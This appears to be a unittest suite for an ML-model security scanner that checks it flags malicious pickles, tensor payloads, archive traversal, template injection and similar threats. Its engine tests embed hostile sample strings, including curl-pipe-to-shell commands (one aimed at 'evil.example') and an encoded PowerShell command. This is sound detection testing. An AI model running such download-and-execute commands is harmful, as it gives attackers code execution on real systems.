"""Adversarial coverage for the v3 engine.

Every test states a threat in terms an operator cares about, then asserts the
scanner reports it with a specific rule id — so a regression is a named, fixable
gap rather than "the number changed".
"""

from __future__ import annotations

import json
import os
from pathlib import Path
import tempfile
import unittest

from aegisml_scanner import AegisML
from aegisml_scanner.matcher import LiteralMatcher, has_text_run
from aegisml_scanner.rules import ALL_RULES, RulePackError, build_ruleset, signature_count
from aegisml_scanner.scanner import _score

from . import corpus


class CorpusCase(unittest.TestCase):
    """Shared corpus, generated once per class."""

    @classmethod
    def setUpClass(cls) -> None:
        cls._temporary = tempfile.TemporaryDirectory()
        cls.root = Path(cls._temporary.name)
        cls.files = corpus.write_corpus(cls.root)
        cls.engine = AegisML(api_url="")
        cls.results = {name: cls.engine.scan(path) for name, path in cls.files.items()}

    @classmethod
    def tearDownClass(cls) -> None:
        cls._temporary.cleanup()

    def ids(self, name: str) -> set[str]:
        return {threat.id for threat in self.results[name].threats}

    def assertDetects(self, name: str, rule_id: str) -> None:
        found = self.ids(name)
        self.assertIn(
            rule_id, found,
            f"{name}: expected {rule_id}; got {sorted(found) or 'no findings'}",
        )


class TestPickle(CorpusCase):
    def test_direct_os_system_is_reconstructed(self):
        self.assertDetects("evil.pkl", "AML.PICKLE.EXEC_CALL")
        self.assertDetects("evil.pkl", "AML.PICKLE.GLOBAL.EXEC")
        call = next(
            threat for threat in self.results["evil.pkl"].threats
            if threat.id == "AML.PICKLE.EXEC_CALL"
        )
        self.assertIn("system", call.description)
        self.assertIn("stage2.sh", call.description)

    def test_protocol_zero_is_covered(self):
        self.assertDetects("evil_proto0.pkl", "AML.PICKLE.EXEC_CALL")

    def test_indirect_eval_gadget(self):
        self.assertDetects("obfuscated.pkl", "AML.PICKLE.EXEC_CALL")

    def test_concatenated_streams_are_reported(self):
        self.assertDetects("concatenated.pkl", "AML.PICKLE.MULTI_STREAM")
        self.assertDetects("concatenated.pkl", "AML.PICKLE.EXEC_CALL")

    def test_clean_pickle_is_flagged_only_as_format_risk(self):
        result = self.results["clean.pkl"]
        self.assertEqual({"AML.PICKLE.FORMAT_UNSAFE"}, self.ids("clean.pkl"))
        self.assertFalse(result.is_safe, "pickle is never safe by construction")
        self.assertLess(result.risk_score, 60)


class TestSafeTensors(CorpusCase):
    def test_clean_file_has_no_findings(self):
        result = self.results["clean.safetensors"]
        self.assertEqual([], result.threats)
        self.assertEqual("SAFE", result.verdict)
        self.assertTrue(result.coverage["complete"])

    def test_unclaimed_slack_is_reported(self):
        self.assertDetects("slack.safetensors", "AML.SAFETENSORS.SLACK")

    def test_overlapping_tensors(self):
        self.assertDetects("overlap.safetensors", "AML.SAFETENSORS.OVERLAP")

    def test_offsets_outside_the_data_region(self):
        self.assertDetects("oob.safetensors", "AML.SAFETENSORS.OFFSET")

    def test_script_hidden_in_tensor_payload(self):
        self.assertDetects("script_in_tensor.safetensors", "AML.TENSOR.TEXT_PAYLOAD")
        finding = next(
            threat for threat in self.results["script_in_tensor.safetensors"].threats
            if threat.id == "AML.TENSOR.TEXT_PAYLOAD"
        )
        self.assertEqual("w", finding.location)

    def test_nan_weights(self):
        self.assertDetects("nan.safetensors", "AML.TENSOR.NAN_INF")

    def test_findings_are_attributed_to_a_tensor(self):
        threats = self.results["script_in_tensor.safetensors"].threats
        self.assertTrue(
            any(threat.region == "w" for threat in threats),
            "byte offsets must resolve to the tensor that contains them",
        )


class TestGGUF(CorpusCase):
    def test_clean_template_is_accepted(self):
        self.assertEqual([], self.results["clean.gguf"].threats)

    def test_chat_template_ssti(self):
        self.assertDetects("ssti.gguf", "AML.GGUF.CHAT_TEMPLATE_SSTI")

    def test_duplicate_metadata_key(self):
        self.assertDetects("dupkey.gguf", "AML.GGUF.DUPLICATE_KEY")


class TestNumPy(CorpusCase):
    def test_object_dtype_reenables_pickle(self):
        self.assertDetects("object.npy", "AML.NPY.OBJECT_DTYPE")
        self.assertDetects("object.npy", "AML.PICKLE.EXEC_CALL")

    def test_clean_array(self):
        self.assertEqual([], self.results["clean.npy"].threats)

    def test_npz_member_is_analysed(self):
        self.assertDetects("bundle.npz", "AML.NPY.OBJECT_DTYPE")


class TestArchives(CorpusCase):
    def test_torch_zip_pickle_and_code(self):
        self.assertDetects("malicious.pt", "AML.PICKLE.EXEC_CALL")
        self.assertDetects("malicious.pt", "AML.PYTORCH.TORCHSCRIPT_CODE")
        self.assertDetects("malicious.pt", "AML.PY.IMPORT_SIDE_EFFECT")

    def test_zip_slip_and_native_member(self):
        self.assertDetects("slip.zip", "AML.ARCHIVE.PATH_TRAVERSAL")
        self.assertDetects("slip.zip", "AML.ARCHIVE.EXECUTABLE_MEMBER")

    def test_tar_symlink(self):
        self.assertDetects("weights.tar", "AML.ARCHIVE.SYMLINK")

    def test_gzip_header_path(self):
        self.assertDetects("traversal.gz", "AML.ARCHIVE.PATH_TRAVERSAL")
        self.assertDetects("traversal.gz", "AML.PY.DANGEROUS_CALL")

    def test_member_location_is_preserved(self):
        threats = self.results["malicious.pt"].threats
        self.assertTrue(
            any("data.pkl" in threat.location for threat in threats),
            "a nested finding must name the archive member it came from",
        )


class TestKeras(CorpusCase):
    def test_legacy_h5_lambda_layer(self):
        self.assertDetects("model.h5", "AML.KERAS.LAMBDA_LAYER")
        self.assertDetects("model.h5", "AML.KERAS.MARSHALLED_CODE")

    def test_keras_v3_archive(self):
        self.assertDetects("model.keras", "AML.KERAS.LAMBDA_LAYER")

    def test_cve_references_are_carried(self):
        threat = next(
            item for item in self.results["model.h5"].threats
            if item.id == "AML.KERAS.LAMBDA_LAYER"
        )
        self.assertIn("CVE-2025-1550", threat.references)


class TestGraphFormats(CorpusCase):
    def test_onnx_custom_domain_and_python_op(self):
        self.assertDetects("malicious.onnx", "AML.ONNX.CUSTOM_DOMAIN")
        self.assertDetects("malicious.onnx", "AML.ONNX.DANGEROUS_OP")

    def test_onnx_external_data_escape(self):
        self.assertDetects("malicious.onnx", "AML.ONNX.EXTERNAL_DATA_PATH")

    def test_clean_onnx(self):
        self.assertEqual([], self.results["clean.onnx"].threats)

    def test_savedmodel_pyfunc(self):
        self.assertDetects("saved_model.pb", "AML.TF.DANGEROUS_OP")

    def test_tflite_custom_operator(self):
        self.assertDetects("custom.tflite", "AML.TFLITE.CUSTOM_OP")
        metadata = self.results["custom.tflite"].metadata["format"]
        self.assertEqual(["EVIL"], metadata["custom_operators"])


class TestRepositoryArtifacts(CorpusCase):
    def test_auto_map_requires_remote_code(self):
        self.assertDetects("config.json", "AML.CONFIG.AUTO_MAP")

    def test_chat_template_ssti_in_tokenizer_config(self):
        self.assertDetects("tokenizer_config.json", "AML.CONFIG.TEMPLATE_SSTI")

    def test_clean_config_is_silent(self):
        self.assertEqual([], self.results["clean_config.json"].threats)

    def test_python_side_effects(self):
        self.assertDetects("modeling_custom.py", "AML.PY.IMPORT_SIDE_EFFECT")
        self.assertDetects("modeling_custom.py", "AML.PY.DANGEROUS_CALL")

    def test_requirements_supply_chain(self):
        self.assertDetects("requirements.txt", "AML.REQ.DIRECT_URL")
        self.assertDetects("requirements.txt", "AML.REQ.INDEX_OVERRIDE")

    def test_executable_disguised_as_weights(self):
        self.assertDetects("disguised.safetensors", "AML.FORMAT.DISGUISED_EXECUTABLE")

    def test_repository_level_correlation(self):
        _results, extra = self.engine.scan_repository(self.root)
        self.assertIn("AML.REPO.REMOTE_CODE_CHAIN", {threat.id for threat in extra})


class TestEngineContract(unittest.TestCase):
    def setUp(self) -> None:
        self._temporary = tempfile.TemporaryDirectory()
        self.root = Path(self._temporary.name)

    def tearDown(self) -> None:
        self._temporary.cleanup()

    def _write(self, name: str, payload: bytes) -> Path:
        target = self.root / name
        target.write_bytes(payload)
        return target

    def test_payload_beyond_any_prefix_limit_is_found(self):
        """A payload at 40 MiB must be found: there is no header-only shortcut."""
        target = self._write("large.bin", b"\x00" * (40 * 1024 * 1024) + b"os.system('id')")
        result = AegisML(api_url="").scan(target)
        threat = next(t for t in result.threats if t.id == "AML.RCE.OS_SYSTEM")
        self.assertEqual([40 * 1024 * 1024], threat.byte_offsets)

    def test_match_across_a_chunk_boundary(self):
        chunk = 1024 * 1024
        payload = b"\x00" * (chunk - 5) + b"subprocess.Popen" + b"\x00" * 32
        target = self._write("boundary.bin", payload)
        result = AegisML(api_url="", chunk_size=chunk).scan(target)
        threat = next(t for t in result.threats if t.id == "AML.RCE.SUBPROCESS")
        self.assertEqual([chunk - 5], threat.byte_offsets)

    def test_hash_and_size_are_exact(self):
        import hashlib

        payload = os.urandom(3 * 1024 * 1024 + 17)
        target = self._write("random.bin", payload)
        result = AegisML(api_url="").scan(target)
        self.assertEqual(hashlib.sha256(payload).hexdigest(), result.metadata["sha256"])
        self.assertEqual(len(payload), result.metadata["bytes_scanned"])
        self.assertTrue(result.coverage["complete"])

    def test_symlinks_are_refused(self):
        target = self._write("real.bin", b"data")
        link = self.root / "link.bin"
        link.symlink_to(target)
        with self.assertRaises(ValueError):
            AegisML(api_url="").scan(link)

    def test_unknown_extension_is_still_scanned(self):
        target = self._write("weights.unknown-format", b"A" * 100 + b"curl http://x/y.sh | sh")
        result = AegisML(api_url="").scan(target)
        self.assertIn("AML.NET.DOWNLOAD_EXEC", {t.id for t in result.threats})

    def test_empty_directory_yields_no_results(self):
        # The CLI turns this into an operational failure rather than a pass.
        self.assertEqual([], AegisML(api_url="").scan_directory(self.root))

    def test_adaptive_tier_still_finds_a_text_payload(self):
        payload = bytearray(os.urandom(24 * 1024 * 1024))
        marker = b"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
        payload[12 * 1024 * 1024: 12 * 1024 * 1024 + len(marker)] = marker
        target = self._write("adaptive.bin", bytes(payload))
        result = AegisML(api_url="", signatures="adaptive").scan(target)
        self.assertIn("AML.RCE.SHELL_WINDOWS", {t.id for t in result.threats})
        self.assertEqual("adaptive", result.coverage["signatures"])

    def test_parallel_and_sequential_agree(self):
        payload = bytearray(os.urandom(160 * 1024 * 1024))
        marker = b"/bin/bash -c 'curl http://evil.example/x | sh'"
        payload[100 * 1024 * 1024: 100 * 1024 * 1024 + len(marker)] = marker
        target = self._write("big.bin", bytes(payload))
        sequential = AegisML(api_url="", signatures="full").scan(target)
        parallel = AegisML(api_url="", signatures="full", jobs=3).scan(target)
        self.assertEqual(sequential.metadata["sha256"], parallel.metadata["sha256"])
        self.assertEqual(
            {t.id for t in sequential.threats}, {t.id for t in parallel.threats}
        )
        offsets = {t.id: t.byte_offsets[0] for t in parallel.threats if t.byte_offsets}
        self.assertEqual(100 * 1024 * 1024, offsets["AML.RCE.SHELL_UNIX"])

    def test_scan_bytes_matches_scan_file(self):
        payload = corpus.evil_pickle()
        target = self._write("x.pkl", payload)
        from_file = AegisML(api_url="").scan(target)
        from_memory = AegisML(api_url="").scan_bytes("x.pkl", payload)
        self.assertEqual(
            {t.id for t in from_file.threats}, {t.id for t in from_memory.threats}
        )


class TestRuleCatalogue(unittest.TestCase):
    def test_every_rule_is_well_formed(self):
        seen = set()
        for rule in ALL_RULES:
            self.assertNotIn(rule.id, seen, f"duplicate rule id {rule.id}")
            seen.add(rule.id)
            self.assertTrue(rule.patterns or rule.regex, f"{rule.id} has no matcher")
            self.assertTrue(rule.remediation, f"{rule.id} has no remediation")
            self.assertGreater(rule.cvss, 0.0, f"{rule.id} has no CVSS")
            self.assertIn(rule.severity, {"info", "low", "medium", "high", "critical"})

    def test_anchor_cover_is_a_true_substring_cover(self):
        matcher = LiteralMatcher(ALL_RULES)
        for anchor, bucket in matcher.index.anchors:
            for _index, pattern, relative in bucket:
                self.assertEqual(pattern[relative: relative + len(anchor)], anchor)
        self.assertLess(matcher.atom_count, signature_count(ALL_RULES))

    def test_every_signature_is_actually_matched(self):
        """The cover must find each signature in isolation — no silent gaps."""
        for rule in ALL_RULES:
            for pattern in rule.patterns:
                matcher = LiteralMatcher(ALL_RULES)
                matcher.feed(b"\x00" * 8 + pattern + b"\x00" * 8, 0)
                found = {matcher.rules[index].id for index in matcher.finish()}
                self.assertIn(
                    rule.id, found,
                    f"{rule.id}: signature {pattern!r} was not matched by the anchor cover",
                )

    def test_rule_pack_loading_and_validation(self):
        with tempfile.TemporaryDirectory() as directory:
            pack = Path(directory) / "pack.json"
            pack.write_text(json.dumps({"rules": [{
                "id": "ORG.SECRET.MARKER", "severity": "high", "cvss": 8.0,
                "category": "custom", "description": "Internal marker.",
                "remediation": "Remove it.", "patterns": ["ACME-INTERNAL-ONLY"],
            }]}))
            ruleset = build_ruleset([pack])
            self.assertIn("ORG.SECRET.MARKER", {rule.id for rule in ruleset})

            broken = Path(directory) / "broken.json"
            broken.write_text(json.dumps({"rules": [{"id": "bad id!", "patterns": ["x"]}]}))
            with self.assertRaises(RulePackError):
                build_ruleset([broken])

    def test_custom_pack_detects_in_a_real_scan(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            pack = root / "pack.json"
            pack.write_text(json.dumps({"rules": [{
                "id": "ORG.CANARY", "severity": "critical", "cvss": 9.0,
                "category": "custom", "description": "Canary token found.",
                "remediation": "Investigate.", "patterns": ["hex:deadbeefcafe"],
            }]}))
            target = root / "weights.bin"
            target.write_bytes(b"\x00" * 4096 + bytes.fromhex("deadbeefcafe"))
            result = AegisML(api_url="", rule_packs=[pack]).scan(target)
            self.assertIn("ORG.CANARY", {t.id for t in result.threats})


class TestScoring(unittest.TestCase):
    def test_score_is_dominated_by_the_worst_finding(self):
        from aegisml_scanner.scanner import Threat

        one = [Threat(pattern="", severity="critical", description="", category="", cvss=9.8)]
        many = one + [
            Threat(pattern="", severity="low", description="", category="", cvss=2.0)
            for _ in range(20)
        ]
        self.assertGreaterEqual(_score(many)[0], _score(one)[0])
        self.assertLessEqual(_score(many)[0], 100.0)

    def test_low_severity_noise_cannot_reach_critical(self):
        from aegisml_scanner.scanner import Threat

        noise = [
            Threat(pattern="", severity="low", description="", category="", cvss=3.0)
            for _ in range(50)
        ]
        score, level = _score(noise)
        self.assertLess(score, 60)
        self.assertNotEqual("critical", level)


class TestGate(unittest.TestCase):
    def test_text_run_gate(self):
        self.assertTrue(has_text_run(b"\x00" * 100 + b"A" * 40, 24))
        self.assertFalse(has_text_run(bytes(range(32)) * 512, 24))


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
